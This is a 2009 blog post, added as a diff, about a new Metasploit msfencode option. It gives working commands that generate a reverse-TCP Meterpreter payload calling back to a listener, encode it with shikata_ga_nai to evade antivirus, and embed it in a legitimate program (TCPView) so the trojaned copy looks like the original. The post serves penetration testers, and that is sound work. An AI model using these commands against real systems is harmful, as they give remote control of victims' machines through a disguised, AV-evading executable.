@@ -1,0 +1,37 @@
+---
+author: mubix
+comments: true
+date: 2009-11-03 03:47:20+00:00
+layout: post
+title: 'Metasploit Blends in: New MSFPayload/ENcode'
+categories:
+- metasploit
+---
+
+In [Revision 7315](https://metasploit.com/redmine/projects/framework/repository/revisions/7315) of the Metasploit Framework (SVN) a new option was added to MSFENCODE. Technically you always had the ability to do the following, but it required a bit of knowledge of the inner workings of the framework.
+
+But before I get into the new feature, lets quickly go over the standard way you use msfencode:
+
+```
+root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -o /tmp/bob.exe       
+[*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) 
+
+root@bt4:/pentest/exploits/framework3#
+```
+
+We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload. We then piped it into MSFENCODE, so that we could output it as a proper Windows executable (/tmp/bob.exe), encoded to avoid AV detection.
+
+Now if you knew where it was (data/templates/template.exe) you could probably just replace the template.exe with the one you want loaded with the payload and called it a day. But then you wouldn’t get some of the tweaks that make this update awesome.
+
+The update added the (-x) option to msfencode. This allows you to specify an executable of your choosing to sacrifice to the gods. For example: (TCPView)
+
+```
+root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443       
+R | ./msfencode -t exe -x /tmp/Tcpview.exe -o /tmp/Tcpview2.exe        
+[*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) 
+
+root@bt4:/pentest/exploits/framework3#
+```
+And if everything went well, we have a nice new executable in /tmp/ called Tcpview2.exe. Want to know the magic part? Try to tell them apart:
+
+![](/images/postimages/200911_msfencode_1.png)
